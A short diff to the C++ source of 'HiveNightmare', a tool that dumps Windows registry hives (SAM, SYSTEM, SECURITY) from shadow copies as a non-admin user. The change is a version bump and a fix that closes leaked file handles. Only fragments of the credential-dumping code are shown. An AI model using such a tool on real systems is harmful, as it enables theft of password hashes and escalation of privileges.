@@ -7,6 +7,7 @@
 // 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
 // 0.4 - 21/07/2021 - better code shocker :O
 // 0.5 - 21/07/2021 - favour retrieving hives from latest snapshot, UTF-16 support, bump to 15 snapshots
+// 0.6 - 26/07/2021 - close file handle to avoid being a dummy
 
 #include <windows.h>
 #include <io.h>
@@ -37,6 +38,9 @@ HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
                     retHandle = hfile;
                     youngest = lastWriteTime;
                     wcout << "Newer file found: " << fullPath << endl;
+                }
+                else {
+                    CloseHandle(hfile);
                 }
             }
         }
@@ -101,7 +105,7 @@ int main(int argc, char* argv[])
         searchDepth = 15;
     }
 
-    wcout << L"\nHiveNightmare v0.5 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
+    wcout << L"\nHiveNightmare v0.6 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
 
     HANDLE hFile;
 
